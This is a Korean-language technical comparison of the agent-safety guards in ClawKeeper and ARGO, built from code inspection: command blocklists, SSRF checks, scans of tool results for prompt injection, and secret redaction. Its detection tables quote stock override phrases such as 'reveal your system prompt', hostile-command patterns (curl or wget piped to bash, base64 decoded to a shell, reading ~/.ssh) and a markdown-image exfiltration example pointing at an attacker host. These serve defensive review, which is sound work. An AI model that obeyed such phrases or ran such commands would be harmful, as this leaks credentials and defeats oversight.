# ClawKeeper × ARGO Safety 기법 대조 분석

작성일 2026-09-02 · 코드 직접 확인 기반 재분석

---

## 0. 분석 방법

**원칙**: README·`docs/`·모듈 주석을 근거로 삼지 않고 구현 코드(함수 본문, 상수 테이블,
호출 지점)를 직접 읽어 판정했다. 주석을 인용한 경우 "주석 주장"임을 명시하고 별도로
코드 검증했다.

**조사 대상 커밋 (고정)**

| 저장소 | 경로 | 커밋 |
|---|---|---|
| ARGO | `~/Works/ARGO-ClawKeeper` (worktree, `dev/byungchul.so/clawkeeper`) | `2205b7c3ff` |
| ClawKeeper | `~/Works/ClawKeeper` (`SafeAI-Lab-X/ClawKeeper`) | `69db077` |
| hermes-agent | `~/Works/hermes-agent` (`NousResearch/hermes-agent`) | `180291162f` |

**검증 등급 표기**

- `[실행경로확인]` — 호출 체인을 끝까지 추적해 실제로 도달하는지 확인
- `[코드확인]` — 구현은 읽었으나 호출 경로는 미추적
- `[실측]` — 코드를 실제로 실행해 동작 확인
- `[미검증]` — 확인하지 못함 (추측으로 채우지 않음)

> **주의**: 같은 이름의 저장소가 둘 있다. `rad-security/clawkeeper`(Bash, OpenClaw 호스트
> 스캐너)는 hermes-agent와 무관하다. 이 문서는 `SafeAI-Lab-X/ClawKeeper`(Python)만 다룬다.

---

## 1. ClawKeeper가 hermes-agent에 적용하는 safety 기법

### 1.1 부착 지점 — 코드로 확인한 3개 훅

`clawkeeper_core/adapters/hermes.py`의 `install(judge, agent)`가 연결하는 지점.
hermes-agent HEAD(`180291162f`)에 해당 심볼이 실재하는지 전부 대조했다. **[실행경로확인]**

| # | ClawKeeper가 부르는 것 | hermes 실재 위치 | 차단력 |
|---|---|---|---|
| ① | `terminal_tool.set_approval_callback(approval_cb)` | `tools/terminal_tool.py:301` | **차단 가능** |
| ① | `computer_use.tool.set_approval_callback(approval_cb)` | `tools/computer_use/tool.py:69` | **차단 가능** |
| ② | `manager._hooks["pre_tool_call"].append(...)` via `hermes_cli.plugins._ensure_plugins_discovered()` | `hermes_cli/plugins.py:7030`, 훅 이름 `:164` | **차단 가능** |
| ③ | `agent.tool_start_callback` / `tool_complete_callback` | `run_agent.py:467` `class AIAgent`, 인자 `:521-522` | **관찰 전용** |

### 1.2 실제로 설치되는 가드는 8개 중 6개

`hermes.py`의 import 목록과 `_default_pre_guards()` / `_default_post_guards()`를 직접 확인한
결과, ClawKeeper의 가드 8종 중 **`input_validator`와 `budget`은 hermes 경로에 전혀
포함되지 않는다.** **[코드확인]**

```python
# clawkeeper_core/adapters/hermes.py:93-117
def _default_pre_guards():
    return [guard_execution, guard_before_tool_call, url_safety_guard, script_body_scan_guard]

def _default_post_guards():
    return [return_content_scan_guard, credential_redact_guard]
```

### 1.3 기법별 상세

#### (a) `exec_gate` — 위험 명령 정규식 차단

`guards/exec_gate.py:97`. `security_rules.DANGEROUS_COMMAND_PATTERNS`(**실측 49개**)를
툴 파라미터 문자열 전체에 `search()`.

```python
# guards/exec_gate.py:112-121
for rule in rules:
    if rule["regex"].search(command):
        return {"block": True, "matched": rule["id"], "severity": rule.get("severity"), ...}
return {"block": False}
```

룰 로드 실패 시 기본 정책은 **fail-closed**(`_DEFAULT_FAILURE_POLICY = "fail-closed"`, `:18`).

> **⚠ 실측된 오탐 문제.** 49개 중 하나가 `_r(r"ver(?:sion)?|systeminfo|whoami")`
> (`security_rules.py:156`)인데, 단어 경계가 없어 **"ver"를 포함한 모든 문자열**에 걸린다.
> 실행해 확인한 결과: **[실측]**
>
> ```
> cat server.log  -> MATCH ver(?:sion)?|systeminfo|whoami
> git log --oneline -> clean
> ls -la          -> clean
> ```
>
> `exec_gate`는 차단 경로(① 승인 콜백, ② pre_tool_call 훅) 양쪽에 들어가므로,
> `cat server.log` 같은 평범한 명령이 **하드 차단**된다.

#### (b) `path_guard` — 보호 경로 차단

`guards/path_guard.py`. 기본 룰 7개(`_DEFAULT_RULES`):
`~/.ssh/**`, `~/.aws/**`, `~/.gnupg/**`(CRITICAL), `~/.env`, `/etc/passwd`(HIGH),
`/etc/shadow`, `/etc/sudoers`(CRITICAL). 파라미터에서 경로 후보를 추출해 정규화 후 glob 매칭.
역시 **fail-closed**. **[코드확인]**

#### (c) `url_safety` — SSRF + 호모글리프

`guards/url_safety.py`. 두 가지 판정을 한다. **[코드확인]**

- **SSRF**: `_BLOCKED_V4_NETS`(10/8, 172.16/12, 192.168/16, 127/8, 169.254/16, 100.64/10,
  0/8, 224/4, 240/4, 255.255.255.255/32) + `_BLOCKED_V6_NETS`(::1, fc00::/7, fe80::/10, ::)
  + `_BLOCKED_HOSTNAMES`(`metadata.google.internal`, `metadata.goog`, `instance-data`).
  **URL에 적힌 리터럴 IP만 검사한다 — DNS 해석은 하지 않는다.**
- **호모글리프**: `_HOMOGLYPH_MAP`(키릴 21자 + 그리스 16자 → ASCII)로 호스트를 치환해
  ASCII 도플갱어를 만들고, 치환이 일어났으면 플래그.

#### (d) `script_body_scan` — 동적 경로 조립 탐지

`guards/script_body_scan.py:111`. 리터럴 경로 정규식이 놓치는
`Path.home()/'.aws'/'credentials'` 같은 런타임 조립을 잡는 **동시출현 휴리스틱**.

민감 디렉터리 마커 18개(`.aws/credentials`, `.ssh/id_`, `.gnupg/`, `.kube/config`,
`/etc/shadow`, `.netrc`, `.pypirc` …)와 파일-오퍼레이션 마커 24개(`Path.home`, `open(`,
`expanduser`, `RawConfigParser`, `cat `, `base64 ` …)가 **같은 command 문자열 안에서
500자 이내**에 함께 나타나면 차단. **[코드확인]**

#### (e) `return_content_scan` — 툴 결과의 프롬프트 인젝션 스캔

`guards/return_content_scan.py:122`. **자체 패턴을 쓴다.**
(`security_rules.PROMPT_INJECTION_PATTERNS` 60개는 이 가드가 아니라 `scanner.py`
로그 스캐너 전용 — 사용처를 grep으로 확인. **[실행경로확인]**)

5개 탐지 범주:

| 범주 | 내용 |
|---|---|
| `override` (4패턴) | `ignore/disregard/forget/override + prior/previous...instructions`, `from now on you are`, `reveal your system prompt`, `maintainer-note`/`sanctioned` |
| `embedded_directive` (3패턴) | `run/execute/also cat` + `~/.ssh|~/.aws|/etc/passwd|.env`, `curl\|wget ... \| bash`, `base64 -d ... \| sh` |
| `comment_directive` (1패턴) | `<!--` / `/*` / `# maintainer-note` 안에 `also run/dump/cat` 등 |
| `invisible_chars` (15 코드포인트) | ZWSP `U+200B`, ZWNJ, ZWJ, word joiner, BOM, bidi override `U+202A-202E`, isolate `U+2066-2069`, soft hyphen |
| `base64_decoded_to_shell` | 24자 이상 base64를 **실제로 디코드**해서 `cat `, `/etc/`, `/.ssh/`, `AKIA`, `id_rsa` 등이 나오면 플래그 |

`override` / `comment_directive` / `base64_decoded_to_shell` / 민감 경로를 지목한
`embedded_directive` → `block: True, severity: critical`. 나머지(비가시 문자 단독) →
`block: False, severity: medium`.

#### (f) `credential_redact` — 패턴 기반 시크릿 마스킹

`guards/credential_redact.py`. 9개 패턴(`github_pat`, `openai_key`(`sk-`/`sk-ant-`),
`aws_access_key_id`, `stripe_key`, `bearer_header`, `jwt`, `ssh_private_key`(6종 헤더),
`generic_secret_kv`, `aws_secret_key`). `[REDACTED]`로 치환. **의도적으로 차단하지 않는다**
(`block: False`). **[코드확인]**

#### (g) `Judge` — 트래젝토리/정책 게이트

`clawkeeper_core/judge.py:125` `judge_forwarded_context()`. 콘텐츠 스캐너가 아니라
**대화 흐름 판정기**. 판정 분기(코드 순서대로): **[코드확인]**

1. 사용자가 중단 요청 → `stop`
2. 상류 툴 에러 존재 → `stop`
3. 사용자 턴 없이 툴 호출 수 > `maxToolStepsWithoutUserTurn` → `ask_user`
4. 명령 실행 툴 감지 + 확인 필요 정책 → `ask_user`
5. 위험도 임계 초과 → `stop`

기본 정책(`judge.py:21-26`):

```python
DEFAULT_POLICY = {
    "maxRiskBeforeStop": "critical",
    "requireUserConfirmationFor": ["exec", "bash", "shell", "network", "write"],
    "autoContinueAllowed": False,
    "maxToolStepsWithoutUserTurn": 3,
    "treatCommandExecutionAsHighRisk": True,
}
```

> **⚠ 기본값이 만드는 결과.** 어댑터는 승인 콜백에서 `{"role":"tool","toolName":"bash"}`를
> 컨텍스트에 덧붙여 Judge에 넘긴다(`hermes.py:168-179`). 따라서 `has_command_tool = True`,
> `autoContinueAllowed = False` → 판정은 항상 `ask_user`. 그런데 어댑터의 매핑표는
> `"ask_user" → "deny"`다(`hermes.py:50-54`, 승인 콜백 안에서는 사용자에게 물을 수 없기 때문).
> **결과적으로 기본 정책에서 승인 콜백에 도달한 명령은 전부 거부된다.**
> 턴 내 툴 호출이 4회를 넘겨도 같은 경로로 거부된다.

### 1.4 체인 실행 규칙

`adapters/base.py:70` `run_guard_chain`. **[코드확인]**

```python
for guard in guards:
    try:
        d = guard(event)
    except Exception as exc:
        d = {"block": False, ...}      # ← 가드가 터지면 fail-OPEN
    if d is None: continue
    seen.append(d)
    if d.get("block") and blocking is None:
        blocking = d
        if stop_on_block: break
```

- 가드 예외 → **fail-open**(통과). 단 `exec_gate`/`path_guard`는 *룰 로드 실패*에 한해
  스스로 fail-closed를 반환한다 — 두 실패 모드가 다르다.
- pre 체인은 `stop_on_block=True`, post 체인은 `False`.

### 1.5 ⚠ 이 통합의 실제 차단력 — 코드로 확인한 두 가지 제약

**(1) post 가드는 hermes에서 아무것도 막지 못한다. [실행경로확인]**

`hermes.py`의 `on_tool_complete`는 `make_event(...)`로 **로컬 dict**를 만들어 체인에 넘긴다.
`credential_redact_guard`는 그 dict의 `event["content"]`를 치환하지만, hermes가 LLM에
전달하는 실제 `result` 객체와는 무관하다. `return_content_scan_guard`가 `block: True`를
반환해도 `_record_decision()`으로 기록만 될 뿐 반환값이 hermes로 전파되지 않는다.

⇒ **ClawKeeper에서 가치가 가장 큰 두 가드(툴 결과 PI 스캔, 시크릿 마스킹)가
hermes 경로에서는 로깅 전용이다.**

**(2) 승인 콜백은 thread-local이라 등록 스레드 밖에서 사라진다. [코드확인]**

```python
# hermes-agent/tools/terminal_tool.py:268, 288-302
_callback_tls = threading.local()
def _get_approval_callback():  return getattr(_callback_tls, "approval", None)
def set_approval_callback(cb): _callback_tls.approval = cb
```

ClawKeeper는 `install()` 시점(메인 스레드)에 한 번만 등록한다. hermes가 툴을 워커 스레드에서
실행하면(같은 파일 주석이 ACP 세션의 `ThreadPoolExecutor`를 명시) 그 스레드의 슬롯은
비어 있어 **승인 콜백 경로가 조용히 사라진다.** 실제 차단은 ②(`pre_tool_call` 훅)에만 남는다.

---

## 2. ARGO safety 기능 전체 인벤토리 (코드 기준)

ClawKeeper 대응 여부와 무관하게 `tinicore`/`tinicore-traits`에서 발견한 safety 관련 모듈 전체.

### 2.1 값 탐지 → 마스킹 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| PII 엔진 | `guardrails/{recognizer,detector,filter,handwritten}.rs` (5.9k) | `regex-automata` lazy DFA + `aho-corasick`. **인식기 49종**(실측) — 카드번호·주민번호·여권·계좌·전화 + GitHub ×7, AWS ×2, Stripe ×2, Slack ×5, GCP/Google ×5, Twilio, PayPal, Braintree, Mailgun, Mailchimp, Square ×2, Facebook ×2, `certificate`, `password`, `api_key`(=`Bearer …`) |
| `SensitiveDetector` 트레잇 | `tinicore-traits/src/sensitive.rs` | 탐지기 계약. **워크스페이스 유일 실제 구현이 `PiiSpanDetector`**(`guardrails/detector.rs:475`) — 나머지 10개 impl은 전부 테스트 더블 |
| `DetectorChain` | `sensitive/chain.rs` (792) | 탐지기 N개 합성. `detect_all`(마스킹, 전원 통과) / `detect_any`(차단, 첫 히트 중단) |
| redaction vault | `sensitive/redaction.rs` (1846) | 마스킹↔복원 라운드트립 보장 |
| `SensitiveGuardrail` | `sensitive/guardrail.rs` (635) | 탐지 결과를 차단 판정으로 |
| `EgressMask` | `agent/pii_masking.rs` (3852) | LLM 송신 직전 마스킹 적용 지점 |

### 2.2 콘텐츠 스캔 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| `audit_text()` | `dispatchable_policy/audit.rs:1016` (2313) | **룰 23개**(실측) / 6범주: `PromptInjection` 4, `DataExfiltration` 4, `CredentialAccess` 8(openai·anthropic·github·aws·ssh·google·slack 포함), `InvisiblePayload` 2(`U+E0001-E007F` tag 코드포인트), `Obfuscation` 3(base64/hex→shell, ANSI), `Privilege` 2. `Severity` 5단계 + `block_threshold` + waiver |
| `PromptGuard` | `agent/prompt_guard.rs` (694) + traits (149) | **인바운드 사용자 메시지**에 대한 PI 탐지. 호스트 공급 정규식 룰, `Warn`/`Sanitize`/`Block` 액션 |
| `static_scan` | `security/static_scan.rs` (278) | 스킬 번들 소스의 위험 패턴 시그니처 스캔 |
| `DeniedPatternGuardrail` | `agent/guardrails_builtin.rs` (667) | `RegexSet` 기반. **4개 가드레일 트레잇을 모두 구현** — 같은 룰셋을 input/output/tool_input/tool_output 어디에나 등록 가능 |
| 분류기 어댑터 | `agent/guardrails_classifier.rs` (1086) | LLM 기반 `AutoModeClassifier`를 TOOL-INPUT 가드레일로. `Accept`/`AskUser*`/`Block` → pass/Escalate/Block |

### 2.3 툴 호출 게이트 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| G1 arg-shape | `agent/guardrails_tool_input/mod.rs` (2554) | 카탈로그 밖 툴명·필수 인자 누락 |
| G2 `command_safety` | 같은 폴더 (1859) | **argv 파싱 화이트리스트**. `UNCONDITIONALLY_SAFE`, `FIND_UNSAFE`, `GIT_UNSAFE_GLOBAL`, `REJECTED_SHELL_CHARS`, sudo/env 래퍼 분해. safe/dangerous/**unknown** 3상태 |
| G3 `secret_path` | 같은 폴더 (573) | `.aws/credentials`, `.kube/config`, `.docker/config.json`, `.gnupg`, `.ssh`(단 `known_hosts`/`config`/`authorized_keys`는 비밀 아님으로 제외) |
| G4 `path_boundary` | 같은 폴더 (407) | 쓰기 대상의 허용 루트 이탈 |
| `path_validator` | `security/path_validator.rs` (1063) | 심볼릭 링크 해석 + 블록리스트. 파일 빌트인이 전부 통과 |
| `confine` | `security/confine.rs` (667) | 앵커 밖으로 벗어나는 경로 거부 |
| `CapabilityBroker` | `tools/capability_map.rs` 외 | 모든 아웃바운드 액션의 권한 검사 |
| 승인 원장 | `agent/approval_ledger.rs`, `approval_store.rs` | principal×tool 영속 승인 기록 |

### 2.4 네트워크 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| `ssrf` | `security/ssrf.rs` (691) | `reject_ssrf_target`(리터럴) + `reject_ssrf_resolved`(**DNS 해석 후 재검사**). loopback/RFC1918/link-local/CGNAT/multicast/benchmark + **IPv4-mapped·compat IPv6 재분류** |
| `network_policy` | `security/network_policy.rs` (1089) | 도메인 allowlist + 사설망 판정. `bash.rs:392`, `url_validator.rs:87` 가 사용 |
| `url_validator` | `security/url_validator.rs` (328) | `validate_outbound_url` |
| `url_redact` | `security/url_redact.rs` (214) | 쿼리 파라미터 시크릿 제거(텔레메트리용) |
| exfil 팩 | `agent/guardrails_exfil/` (2557) | `url_scan.rs` — 제로클릭 마크다운 이미지 유출 채널 탐지 / `secret_needles.rs` — env 시크릿 **값** 유출 경보 |

### 2.5 시크릿 관리 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| `tools/scrubber` | `tools/scrubber.rs` (956) | 툴 출력 3패스: **env 시크릿 값 치환** → base64 블롭 축약 → 크기 상한 |
| `output_scrubber` | `security/output_scrubber.rs` (279) | 심층 방어용 시크릿 값 스크럽 |
| `credential_proxy` | `security/credential_proxy.rs` (1000) | 실행 직전 마지막 단계에서만 시크릿 주입 — hand는 원본 토큰을 못 봄 |
| `secret_scope` / `secret_tracker` / `secret_ref` / `secret_vault` | `security/` (1203+) | 툴별 시크릿 접근 범위, 접근 횟수 이상 탐지, 참조 기반 전달 |

### 2.6 실행 격리 축

| 모듈 | 위치 (LOC) | 실제 하는 일 |
|---|---|---|
| `SkillSandbox` | `security/sandbox.rs` (1512) | 스킬 실행 통합 진입점 |
| `ExecSandbox` | `tinicore-traits/src/exec_sandbox.rs` | OS 격리 계약 |
| `integrity` | `security/integrity.rs` | 인증 스킬 SHA-256 변조 탐지 |
| Untrusted 봉투 | `tool_orchestrator/execution.rs` `post_execute`, `TrustTier::Untrusted` | 미등록/외부 툴 결과를 "신뢰 불가"로 태깅 → 프롬프트 격리 봉투로 감싸 LLM에 전달. **fail-closed**(`tool_def` 없으면 Untrusted 취급) |

### 2.7 배선 지점

| 지점 | 위치 | 비고 |
|---|---|---|
| TOOL-INPUT 체인 | `tool_orchestrator/execution.rs:2800` | `run_tool_input_guardrails_where` |
| TOOL-OUTPUT 체인 | `tool_orchestrator/execution.rs:3221` | `run_tool_output_guardrails`. 주석이 "간접 프롬프트 인젝션 경계"로 명시. 모든 dispatch 경로 공통 |
| 시크릿 스크럽 | `tool_orchestrator/execution.rs:3866` | `scrubber::finalize_result_safety` — **조건 없이 호출** |
| 인바운드 PromptGuard | `agent/loop_.rs:674` | 첫 LLM 왕복 전 |
| 매니페스트 감사 | `tools/registry/store.rs:418`, `dispatchable_policy/discovery.rs:731` | `audit_text` 호출부 — **이 둘뿐** |

---

## 3. 1:1 매칭표

등급: **완전대응** / **부분대응** / **ClawKeeper에만 있음** / **ARGO에만 있음**

### 3.1 ClawKeeper 기준

| ClawKeeper 기법 | ARGO 대응물 | 등급 | 차이 (코드 근거) |
|---|---|---|---|
| `exec_gate` (블랙리스트 정규식 49) | `guardrails_tool_input/command_safety.rs` | **부분대응** | 패러다임이 반대. ARGO는 argv를 파싱하는 **화이트리스트**(안전 증명 실패 → `unknown` → 사람에게 에스컬레이션)로 3상태. ClawKeeper는 블랙리스트 2상태이며 미매치 시 통과. ARGO 쪽이 구조적으로 강하고, ClawKeeper 쪽은 `ver` 오탐 실측됨 |
| `path_guard` (glob 7) | `guardrails_tool_input/secret_path.rs` + `path_boundary.rs` + `security/path_validator.rs` + `confine.rs` | **완전대응** | ARGO가 더 세밀(`.ssh/known_hosts`는 비밀 아님으로 예외 처리, `.kube/config`·`.docker/config.json` 포함) + 심볼릭 링크 해석까지 |
| `url_safety` — SSRF 절반 | `security/ssrf.rs` | **완전대응** | ARGO가 더 강함: **DNS 해석 후 재검사**(ClawKeeper는 리터럴 IP만), IPv4-mapped/compat IPv6 재분류, benchmark 대역 포함. 단 적용 범위는 `web_render`/브라우저 어댑터 한정 |
| `url_safety` — 호모글리프 절반 | 없음 (`skills/mod.rs:676,2024`는 스킬 **ID**의 제로폭·Trojan Source 방어로 범위가 다름) | **ClawKeeper에만 있음** | 도메인 호모글리프(키릴 `а`→`a`) 판정은 ARGO에 없음 |
| `script_body_scan` (동적 경로 조립) | 없음 | **ClawKeeper에만 있음** | ARGO의 `secret_path`/`path_validator`는 리터럴/해석 가능한 경로 대상. `Path.home()/'.aws'/'credentials'` 같은 런타임 조립을 근접도로 잡는 로직은 없음 |
| `return_content_scan` (툴 결과 PI) | `dispatchable_policy::audit_text()` — 룰은 대응, **적용 지점이 다름** | **부분대응** | 탐지 범주는 거의 겹침(override↔PromptInjection, invisible↔InvisiblePayload, base64→shell↔Obfuscation, embedded_directive↔DataExfiltration). 단 ARGO는 **스킬/툴 매니페스트 등록 시점에만** 호출(`store.rs:418`, `discovery.rs:731`) — **런타임 툴 결과에는 호출되지 않음**. 반대로 ClawKeeper는 hermes에서 로깅 전용(§1.5) — **양쪽 다 실효 차단이 없다** |
| `credential_redact` (패턴 9) | PII 엔진 49종 + `audit.rs` CredentialAccess 8 + `tools/scrubber.rs` + `guardrails_exfil/secret_needles.rs` | **완전대응** | 커버리지는 ARGO가 넓음. 방식이 셋으로 나뉨: 패턴 기반(PII 엔진), 값 기반(scrubber — env 실제 값), 감사(audit.rs). ClawKeeper 9패턴 중 ARGO에 없는 것은 사실상 `jwt`뿐 |
| `input_validator` | `guardrails_tool_input/mod.rs` G1 | **완전대응** | 단 ClawKeeper는 **hermes 경로에 설치조차 안 됨**(§1.2) |
| `budget` (토큰 예산) | 없음 | **ClawKeeper에만 있음** | 단 hermes 경로에 설치 안 됨. ARGO Core는 `Path::home()`/env 직접 읽기가 레이어 규칙 위반이라 그대로 이식 불가 |
| `Judge` (트래젝토리 게이트) | `agent/guardrails_classifier.rs`(LLM 분류기) + 승인 흐름 | **부분대응** | ClawKeeper Judge는 **규칙 기반**(툴 호출 수 임계, 명령툴 감지). ARGO는 LLM 분류기 + `Escalate` 디스포지션으로 승인 흐름 라우팅. "턴 내 툴 호출 N회 초과 시 사용자 확인" 같은 **루프 임계 규칙은 ARGO에 대응물 없음** |
| Watcher (외부 LLM 트래젝토리 감시, 선택) | `guardrails_classifier.rs` | **부분대응** | 둘 다 LLM 판정. ARGO는 툴별 `ToolSignal`이 있어야만 분류(신호 없으면 분류 안 함), ClawKeeper는 별도 데몬 |

### 3.2 ARGO에만 있음

| ARGO 기능 | 위치 | ClawKeeper 대응 없음 |
|---|---|---|
| 가역 마스킹 vault | `sensitive/redaction.rs` | 마스킹→LLM→복원 라운드트립. ClawKeeper는 `[REDACTED]` 단방향 |
| 한국/미국 PII 인식기 | `guardrails/config/pii_filter_config.yaml` | 주민등록번호·운전면허·여권·계좌·전화 + Luhn/체크섬 검증. ClawKeeper는 PII 패턴이 전무(시크릿만) |
| Untrusted 프롬프트 격리 봉투 | `execution.rs` `post_execute` | 차단 대신 **태깅** — 신뢰 불가 출처를 LLM에 명시. fail-closed |
| `CapabilityBroker` | `tools/capability_map.rs` | 모든 아웃바운드 액션의 권한 게이트 |
| 시크릿 참조/스코프/추적 | `security/secret_{ref,scope,tracker,vault}` | 툴별 접근 범위 + 접근 횟수 이상 탐지 + 마지막 단계 주입 |
| 실행 샌드박스 | `security/sandbox.rs`, `confine.rs`, `exec_sandbox.rs` | OS 수준 격리 |
| 스킬 무결성 | `security/integrity.rs` | SHA-256 변조 탐지 |
| 제로클릭 유출 채널 탐지 | `guardrails_exfil/url_scan.rs` | `![](https://attacker/leak?d=…)` 마크다운 이미지 |
| 인바운드 PromptGuard | `agent/prompt_guard.rs` | 사용자 메시지 자체에 대한 PI 게이트 |
| 도메인 allowlist | `security/network_policy.rs` | 이그레스 허용 목록 |

---

## 4. ARGO 대응 기능의 활성화 상태

**(a) 코드 존재 / (b) 기본 빌드 컴파일 / (c) 런타임 실제 실행** 3단계로 분리 판정.

| 기능 | (a) 코드 | (b) 기본 빌드 | (c) 런타임 기본 동작 | 최종 |
|---|---|---|---|---|
| `tools/scrubber` 시크릿 스크럽 | ✅ | ✅ (feature 무관) | ✅ `execution.rs:3866`에서 **조건 없이 호출** | **ON** |
| Untrusted 프롬프트 격리 | ✅ | ✅ | ✅ `post_execute`에서 항상, `tool_def` 없으면 Untrusted (fail-closed) | **ON** |
| `security/ssrf` | ✅ | ✅ | ✅ `web_render.rs:192,217` + `tinicli/adapters/web_render_ssrf.rs`에서 무조건 | **ON** (해당 툴 한정) |
| `path_validator` / `confine` | ✅ | ✅ | ✅ 파일 빌트인이 통과 (`tools/builtins/mod.rs:230`) | **ON** |
| `network_policy` | ✅ | ✅ | ✅ `bash.rs:392`, `url_validator.rs:87` | **ON** |
| `audit_text` (23룰) | ✅ | ✅ | ⚠ 호출부가 **매니페스트 등록 2곳뿐**(`store.rs:418`, `discovery.rs:731`) — 툴 결과·LLM 출력에는 미적용 | **부분 ON** |
| PII 엔진 (49 인식기) | ✅ | ❌ `guardrails` feature가 `tinicore`/`tinicli`/`argo-cli` **어느 default에도 없음** (`tinicore/Cargo.toml:19-27`에 "deliberately NOT in this list" 명시) | ❌ 컴파일 자체가 안 됨 | **OFF** |
| PII 마스킹 (`EgressMask`) | ✅ | ✅ `sensitive` feature는 default ON | ❌ 꽂을 탐지기(`PiiSpanDetector`)가 위에서 컴파일 제외 + `pii_mode` 기본 `Off`(`PiiMode::parse(None) → Off`) | **OFF** (이중 게이트) |
| TOOL-INPUT 팩 (G1~G4) | ✅ | ✅ | ❌ `ARGO_GUARDRAIL_TOOL_PACK` env에 JSON이 있을 때만 설치(`guardrails.rs:1066`). 레포에 기본 세팅 없음 | **OFF** |
| exfil 팩 (url_scan, needles) | ✅ | ✅ | ❌ `ARGO_GUARDRAIL_EXFIL` env 필요(`guardrails.rs:1088`) | **OFF** |
| `DeniedPatternGuardrail` | ✅ | ✅ | ❌ `ARGO_GUARDRAIL_DENY_*` env 패턴 필요. 빈 패턴이면 `Ok(None)` → 등록 자체 안 함 | **OFF** |
| TOOL-OUTPUT 가드레일 체인 | ✅ 배선 코드 존재 (`execution.rs:3221`) | ✅ | ❌ `set.tool_output`이 비어 블록 미실행 (위 세 팩이 모두 OFF이므로) | **OFF** |
| `PromptGuard` | ✅ | ✅ | ❌ `ctx.config.prompt_guard.is_empty()` → skip (`loop_.rs:681`). **tinicli에 이 설정을 채우는 코드가 없음** | **OFF** |
| 분류기 가드레일 | ✅ | ✅ | ❌ 호스트가 툴별 `ToolSignal`을 공급해야 분류. 미공급 툴은 분류 안 함 | **OFF** |

### 4.1 왜 이렇게 되어 있나 (코드에 적힌 근거)

`tinicore/Cargo.toml:19-27`와 `agent/guardrails.rs:1020`의 구조를 보면 의도적이다 —
Core 레이어 규칙상 **Core는 정책을 하드코딩할 수 없고**, 모든 룰은 호스트(Product)가
공급해야 한다. 그 결과 "메커니즘은 다 있는데 기본값이 비어 있어 아무것도 안 도는" 상태가
기본이 된다. 실제로 `install_guardrails_from_env`를 호출하는 곳은
`tinicli/src/cli_entry.rs:158`과 `tiniffi/src/lib.rs:28645` 둘뿐이고, 둘 다 env 기반이며
레포 어디에도 그 env를 채워 주는 기본 설정이 없다.

### 4.2 요약

- **기본으로 켜져 있는 것**: 시크릿 값 스크럽, Untrusted 격리 봉투, SSRF, 경로 검증,
  네트워크 정책, 매니페스트 감사(등록 시점 한정)
- **꺼져 있는 것**: PII 탐지·마스킹 전부, 툴 입력 팩 G1~G4, exfil 팩, 패턴 가드레일,
  TOOL-OUTPUT 체인 전체, PromptGuard, LLM 분류기

---

## 5. 결론 요약표

| ClawKeeper 모듈 | ARGO 대응 | 대응물 현재 상태 | **ARGO 도입 필요 여부** |
|---|---|---|---|
| `script_body_scan` | 없음 | — | **도입 권장 (1순위)** — 진짜 공백. 동적 경로 조립은 ARGO의 리터럴 경로 검증을 우회함 |
| `url_safety` 호모글리프 | 없음 | — | **도입 권장 (2순위)** — 도메인 위장 판정 공백. `security/url_validator.rs` 옆이 제자리 |
| `return_content_scan` | `audit_text` 룰은 있음, 적용 지점 없음 | 매니페스트 등록 시점만 | **룰 이식 불필요 · 배선만 필요 (1순위와 동급)** — `audit_text`를 `ToolOutputGuardrail`로 감싸 `execution.rs:3221` 체인에 등록. 새 정규식 0개 |
| `Judge`의 툴 루프 임계 | 없음 (승인 흐름은 있으나 "턴 내 N회" 규칙 없음) | — | **조건부 도입** — 다중 턴 drift 방어. 단 ClawKeeper 기본값(`maxToolStepsWithoutUserTurn: 3`)은 실사용에 지나치게 낮음 |
| `exec_gate` | `command_safety` (화이트리스트, 더 강함) | 기본 OFF | **불필요** — 이식하면 오히려 약해짐. `ver` 오탐 실측 |
| `path_guard` | `secret_path` + `path_boundary` + `path_validator` | 일부 ON | **불필요** — ARGO가 더 세밀 |
| `url_safety` SSRF | `security/ssrf.rs` (DNS 재검사까지) | **ON** | **불필요** — ARGO가 더 강함 |
| `credential_redact` | PII 엔진 + `audit.rs` + `scrubber` | scrubber만 ON | **불필요 (단 `jwt` 인식기 1종 추가 권장)** — 정규식은 `audit.rs`에서 가져올 것 |
| `input_validator` | G1 arg-shape | 기본 OFF | **불필요** — ClawKeeper도 hermes에 설치 안 함 |
| `budget` | 없음 | — | **불필요** — 가드가 아니고 Core 레이어 규칙 위반 |
| Watcher (LLM 감시) | `guardrails_classifier` | 기본 OFF | **불필요** — 메커니즘 이미 있음 |

### 5.1 가장 중요한 발견

**이식보다 배선이 우선이다.** ARGO는 ClawKeeper가 제공하는 방어의 대부분을 이미 코드로
갖고 있고, 여러 곳에서 더 강하다(argv 화이트리스트, DNS 해석 SSRF, 가역 마스킹, PII 인식기
49종). 그런데 §4 표대로 **정작 대부분이 기본 OFF**다. 반대로 ClawKeeper 쪽도 hermes에서
가장 가치 있는 두 가드가 로깅 전용이다(§1.5).

따라서 실제 보안 효과 순서는:

1. **`audit_text`를 TOOL-OUTPUT 체인에 등록** — 룰을 새로 쓰지 않고 이미 있는 탐지기를
   안 보고 있는 지점에 연결. 투입 대비 효과 최대
2. **기본 정책 배포 결정** — Core가 정책을 못 박을 수 없다면, 호스트(tinicli) 기본 프로필로
   권장 설정을 제공할지 결정. 이 결정 없이는 아래 3·4를 만들어도 기본값에서 안 돈다
3. `script_body_scan` 신규 구현
4. 호모글리프 판정 신규 구현

---

## 부록. 검증 재현용 명령어

```bash
# 커밋 고정 확인
for d in ARGO-ClawKeeper ClawKeeper hermes-agent; do
  printf "%-16s " "$d"; git -C ~/Works/$d log --oneline -1; done

# ClawKeeper가 hermes에 설치하는 가드 (input_validator/budget 부재 확인)
sed -n '/^def _default_pre_guards/,/^def install/p' ~/Works/ClawKeeper/clawkeeper_core/adapters/hermes.py

# 패턴 카탈로그 사용처 — PROMPT_INJECTION_PATTERNS가 hermes 경로에 없음을 확인
grep -rn "PROMPT_INJECTION_PATTERNS\|DANGEROUS_COMMAND_PATTERNS" \
  ~/Works/ClawKeeper/clawkeeper_core/ --include="*.py"

# exec_gate 오탐 실측
cd ~/Works/ClawKeeper && python3 -c "
import importlib.util, sys
spec = importlib.util.spec_from_file_location('sr','clawkeeper_core/security_rules.py')
sr = importlib.util.module_from_spec(spec); sys.modules['sr']=sr; spec.loader.exec_module(sr)
for cmd in ['cat server.log','git log --oneline','ls -la']:
